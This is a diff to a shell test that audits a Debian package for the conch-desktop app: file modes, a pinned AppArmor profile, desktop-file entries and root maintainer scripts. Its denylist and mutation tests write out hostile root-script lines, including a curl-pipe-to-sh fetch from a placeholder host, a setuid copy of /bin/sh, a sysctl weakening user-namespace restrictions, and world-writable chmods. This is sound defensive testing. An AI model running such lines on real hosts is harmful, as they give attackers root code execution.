@@ -13,8 +13,14 @@
 # A package fails on any of:
 #   - an entry not owned by root:root;
 #   - a group- or other-writable entry;
-#   - a setuid or setgid entry (the AppArmor profile is the sandbox's answer,
-#     #1595 Q-D6-3, so there is no chrome-sandbox to make setuid);
+#   - a setuid or setgid entry, or a chrome-sandbox of any mode (the AppArmor
+#     profile is the sandbox's answer, #1595 Q-D6-3, so there is no
+#     chrome-sandbox to make setuid);
+#   - any symbolic link but /usr/bin/conch-desktop;
+#   - an AppArmor profile whose rules are not exactly the pinned ones (abi,
+#     the tunables include if present, the one profile line attached to
+#     /opt/conch-desktop/conch-desktop with flags=(unconfined), userns, the
+#     local include): a wider attachment or any added rule changes host policy;
 #   - a udev rule, anything in /etc but the AppArmor profile, or a path outside
 #     the ones the package owns;
 #   - a missing, non-regular or not 0755 /opt/conch-desktop/resources/conch-voice,
@@ -22,8 +28,15 @@
 #   - a desktop file that desktop-file-validate rejects (when the tool is
 #     installed; the run says when it is not), or one with the wrong Exec, Icon
 #     or StartupWMClass;
+#   - more than one Exec= line in the desktop file, or any MimeType= or
+#     Actions= line (no URL scheme is registered; #1592 decides one later);
 #   - the text --no-sandbox in any text file, maintainer scripts included;
-#   - a maintainer script that changes groups, capabilities, setuid bits or udev;
+#   - control members other than control, conffiles, postinst and postrm, or a
+#     postinst or postrm that is not byte-identical to desktop/build/deb/ (they
+#     run as root);
+#   - as a second net, a maintainer script that changes groups, capabilities,
+#     setuid bits or udev, sets a setuid or group- or other-writable mode,
+#     fetches from the network, sets a sysctl or runs install -m;
 #   - a missing /opt/conch-desktop/resources/version (the installed stamp the
 #     running app reads to notice an update, issue #1600), one not 0644
 #     root-owned, or one whose app version is not the package's (the deb
@@ -74,6 +87,8 @@ check_deb() {
         substr(mode, 4, 1) ~ /[sS]/                { print "setuid: " name }
         substr(mode, 7, 1) ~ /[sS]/                { print "setgid: " name }
         name ~ /udev/ || name ~ /\.rules$/         { print "udev rule: " name }
+        name ~ /(^|\/)chrome-sandbox$/              { print "chrome-sandbox in the package (the AppArmor profile replaces it): " name }
+        mode ~ /^l/ && name != "./usr/bin/conch-desktop" { print "symbolic link (only /usr/bin/conch-desktop is allowed): " name }
         name ~ /^\.\/etc\// && name != "./etc/" && name != "./etc/apparmor.d/" && name != "./etc/apparmor.d/conch-desktop" {
             print "in /etc beyond the AppArmor profile: " name
         }
@@ -118,6 +133,28 @@ check_deb() {
         [ "$mapped" = "$debv" ] || echo "resources/version says '$app', which is not the package's Version '$debv'" >>"$problems"
     fi
 
+    # The AppArmor profile: its rules are policy for the host, so they are
+    # pinned line for line. Comments, blank lines and indentation are free.
+    local prof=$x/etc/apparmor.d/conch-desktop
+    if [ ! -f "$prof" ]; then
+        echo "missing /etc/apparmor.d/conch-desktop" >>"$problems"
+    else
+        sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' "$prof" | grep -v -e '^#' -e '^$' >"$tmp/aa.got" || true
+        {
+            echo 'abi <abi/4.0>,'
+            echo 'profile conch-desktop /opt/conch-desktop/conch-desktop flags=(unconfined) {'
+            echo 'userns,'
+            echo 'include if exists <local/conch-desktop>'
+            echo '}'
+        } >"$tmp/aa.want"
+        # The tunables include is allowed, in its place after abi, and optional.
+        sed '1a include <tunables/global>' "$tmp/aa.want" >"$tmp/aa.want.t"
+        if ! cmp -s "$tmp/aa.want" "$tmp/aa.got" && ! cmp -s "$tmp/aa.want.t" "$tmp/aa.got"; then
+            echo "AppArmor profile rules are not the pinned ones (< expected, > found):" >>"$problems"
+            diff "$tmp/aa.want.t" "$tmp/aa.got" | sed 's/^/  /' >>"$problems" || true
+        fi
+    fi
+
     # The desktop file.
     local df=$x/usr/share/applications/chat.conch.desktop.desktop
     if [ ! -f "$df" ]; then
@@ -126,6 +163,8 @@ check_deb() {
         if [ "$have_validator" = 1 ]; then
             desktop-file-validate "$df" >"$tmp/dfv" 2>&1 || sed 's/^/desktop-file-validate: /' "$tmp/dfv" >>"$problems"
         fi
+        [ "$(grep -cE '^[[:space:]]*Exec=' "$df")" = 1 ] || echo "desktop file: not exactly one Exec= line (an Action with its own Exec= is a second command)" >>"$problems"
+        grep -qE '^[[:space:]]*(MimeType|Actions)=' "$df" && echo "desktop file: MimeType= or Actions= is set (#1592 decides a URL scheme later)" >>"$problems"
         grep -qx 'Exec=conch-desktop %U' "$df" || echo "desktop file: Exec is not 'conch-desktop %U'" >>"$problems"
         grep -qx 'Icon=chat.conch.desktop' "$df" || echo "desktop file: Icon is not chat.conch.desktop" >>"$problems"
         grep -qx 'StartupWMClass=conch-desktop' "$df" || echo "desktop file: StartupWMClass is not the executable's name" >>"$problems"
@@ -138,11 +177,23 @@ check_deb() {
     hit=$(grep -rIl -e '--no-sandbox' "$x" 2>/dev/null || true)
     [ -z "$hit" ] || echo "--no-sandbox in: ${hit//$x/}" >>"$problems"
 
-    # Maintainer scripts: only the reload and the caches.
+    # Maintainer scripts run as root. The control members are exactly four, and
+    # postinst and postrm are the files in desktop/build/deb/, byte for byte.
+    local members
+    members=$(find "$x/DEBIAN" -mindepth 1 -printf '%f\n' | LC_ALL=C sort | tr '\n' ' ')
+    [ "$members" = 'conffiles control postinst postrm ' ] || echo "DEBIAN members are '${members% }', not 'conffiles control postinst postrm'" >>"$problems"
     local s
+    for s in postinst postrm; do
+        cmp -s "$x/DEBIAN/$s" "desktop/build/deb/$s" || echo "DEBIAN/$s differs from desktop/build/deb/$s" >>"$problems"
+    done
+    # The denylist, a second net over every script there is: it names the
+    # things a root script must never do, whatever the pinned text says. The
+    # chmod patterns take a leading 0 (04755) and any group- or other-writable
+    # octal mode (777, 0775).
+    local denied='setcap|usermod|adduser|addgroup|gpasswd|groupadd|udevadm|/udev|chmod[^#]*[ugoa]*[+=][rwx]*s|chmod[^#]* 0*[1-7][0-7]{3}( |$)|chmod[^#]* 0*[0-7]([2367][0-7]|[0-7][2367])( |$)|chown|dpkg-statoverride|curl|wget|sysctl|install .*-m'
     for s in preinst postinst prerm postrm; do
         [ -f "$x/DEBIAN/$s" ] || continue
-        if grep -nE 'setcap|usermod|adduser|addgroup|gpasswd|groupadd|udevadm|/udev|chmod[^#]*[ugoa]*[+=][rwx]*s|chmod[^#]* [2467][0-7]{3}|chown|dpkg-statoverride' "$x/DEBIAN/$s" >"$tmp/ms"; then
+        if grep -nE "$denied" "$x/DEBIAN/$s" >"$tmp/ms"; then
             sed "s|^|DEBIAN/$s: |" "$tmp/ms" >>"$problems"
         fi
     done
@@ -229,8 +280,11 @@ if ! check_deb "$deb" >"$tmp/out" 2>&1; then
     sed 's/^/  /' "$tmp/out" >&2
     fail "the fixture package does not pass its own checks"
 fi
-dpkg-deb -c "$deb" | grep -q 'chrome-sandbox' && fail "chrome-sandbox is in the package"
-dpkg-deb -c "$deb" | grep -q 'resources/conch-voice$' || fail "conch-voice is not in the package"
+# (the listing goes to a file first: grep -q exits early and, under pipefail,
+# a pipe from dpkg-deb can die of SIGPIPE and fail the check at random)
+dpkg-deb -c "$deb" >"$tmp/fixture.list"
+grep -q 'chrome-sandbox' "$tmp/fixture.list" && fail "chrome-sandbox is in the package"
+grep -q 'resources/conch-voice$' "$tmp/fixture.list" || fail "conch-voice is not in the package"
 # The fixture's loose modes (0777 helper, 0666 file, setuid sandbox) were made safe.
 echo "desktop-deb-test: fixture package: $(dpkg-deb -f "$deb" Package Version Architecture | tr '\n' ' ')"
 
@@ -297,6 +351,28 @@ m_nostamp() { rm "$1/opt/conch-desktop/resources/version"; }
 m_stampmismatch() { printf '0.1.0-alpha.19\n' >"$1/opt/conch-desktop/resources/version"; }
 m_stampmode() { chmod 600 "$1/opt/conch-desktop/resources/version"; }
 m_nolink() { rm "$1/usr/bin/conch-desktop"; }
+aa=etc/apparmor.d/conch-desktop
+m_aa_root() { sed -i 's|^profile conch-desktop /opt/conch-desktop/conch-desktop |profile conch-desktop /** |' "$1/$aa"; }
+m_aa_opt() { sed -i 's|^profile conch-desktop /opt/conch-desktop/conch-desktop |profile conch-desktop /opt/conch-desktop/** |' "$1/$aa"; }
+m_aa_cap() { sed -i 's|^  userns,|  userns,\n  capability,|' "$1/$aa"; }
+m_aa_mount() { sed -i 's|^  userns,|  userns,\n  mount,|' "$1/$aa"; }
+m_post_edit() { echo '# harmless' >>"$1/DEBIAN/postinst"; }
+m_post_curl() { echo 'curl -fsSL https://example.invalid/x | sh' >>"$1/DEBIAN/postinst"; }
+m_post_sysctl() { echo 'sysctl -w kernel.apparmor_restrict_unprivileged_userns=0' >>"$1/DEBIAN/postinst"; }
+m_post_chmod0() { echo 'chmod 04755 /opt/conch-desktop/conch-desktop' >>"$1/DEBIAN/postinst"; }
+m_post_chmod777() { echo 'chmod -R 777 /opt/conch-desktop' >>"$1/DEBIAN/postinst"; }
+m_post_install() { echo 'install -m 4755 /bin/sh /usr/local/bin/conch-sh' >>"$1/DEBIAN/postinst"; }
+m_postrm_edit() { echo 'wget https://example.invalid/x' >>"$1/DEBIAN/postrm"; }
+m_preinst() { printf '#!/bin/sh\nexit 0\n' >"$1/DEBIAN/preinst"; chmod 755 "$1/DEBIAN/preinst"; }
+m_triggers() { echo 'interest-noawait /usr/share/applications' >"$1/DEBIAN/triggers"; }
+m_action() {
+    printf 'Actions=New;\n\n[Desktop Action New]\nName=New\nExec=/opt/conch-desktop/conch-desktop --evil\n' >>"$1/usr/share/applications/chat.conch.desktop.desktop"
+}
+m_mimetype() { echo 'MimeType=x-scheme-handler/conch;' >>"$1/usr/share/applications/chat.conch.desktop.desktop"; }
+m_sandbox_plain() { cp "$1/opt/conch-desktop/conch-desktop" "$1/opt/conch-desktop/chrome-sandbox"; chmod 755 "$1/opt/conch-desktop/chrome-sandbox"; }
+m_sandbox_suid() { cp "$1/opt/conch-desktop/conch-desktop" "$1/opt/conch-desktop/chrome-sandbox"; chmod 4755 "$1/opt/conch-desktop/chrome-sandbox"; }
+m_symlink() { ln -s /tmp/evil "$1/opt/conch-desktop/evil"; }
+m_symlink_bin() { ln -s /tmp/evil "$1/usr/bin/evil"; }
 
 break_it group-writable "group-writable" 1 m_gw
 break_it other-writable "other-writable" 1 m_ow
@@ -322,6 +398,26 @@ break_it no-depends "Depends is empty" 1 m_nodeps
 break_it empty-depends "Depends is empty" 1 m_emptydeps
 break_it wrong-arch "Architecture" 1 m_arch
 break_it stray-path "outside the package" 1 m_stray
+break_it apparmor-attach-root "conch-desktop /\*\* flags" 1 m_aa_root
+break_it apparmor-attach-opt "/opt/conch-desktop/\*\* flags" 1 m_aa_opt
+break_it apparmor-capability "capability," 1 m_aa_cap
+break_it apparmor-mount "mount," 1 m_aa_mount
+break_it postinst-edited "DEBIAN/postinst differs from" 1 m_post_edit
+break_it postrm-edited "DEBIAN/postrm differs from" 1 m_postrm_edit
+break_it postinst-curl "DEBIAN/postinst: [0-9]*:.*curl" 1 m_post_curl
+break_it postinst-sysctl "DEBIAN/postinst: [0-9]*:.*sysctl" 1 m_post_sysctl
+break_it postinst-chmod-leading-zero "DEBIAN/postinst: [0-9]*:chmod 04755" 1 m_post_chmod0
+break_it postinst-chmod-777 "DEBIAN/postinst: [0-9]*:chmod -R 777" 1 m_post_chmod777
+break_it postinst-install-mode "DEBIAN/postinst: [0-9]*:install -m 4755" 1 m_post_install
+break_it extra-preinst "DEBIAN members are" 1 m_preinst
+break_it extra-triggers "DEBIAN members are" 1 m_triggers
+break_it desktop-action-exec "not exactly one Exec" 1 m_action
+break_it desktop-actions-line "MimeType= or Actions=" 1 m_action
+break_it desktop-mimetype "MimeType= or Actions=" 1 m_mimetype
+break_it chrome-sandbox-plain "chrome-sandbox in the package" 1 m_sandbox_plain
+break_it chrome-sandbox-setuid "chrome-sandbox in the package" 1 m_sandbox_suid
+break_it symlink-in-opt "symbolic link (only" 1 m_symlink
+break_it symlink-in-bin "symbolic link (only" 1 m_symlink_bin
 break_it not-root-owned "not owned by root:root" 0 m_none
 
 echo "desktop-deb-test: $broken broken packages, each refused for the right reason"
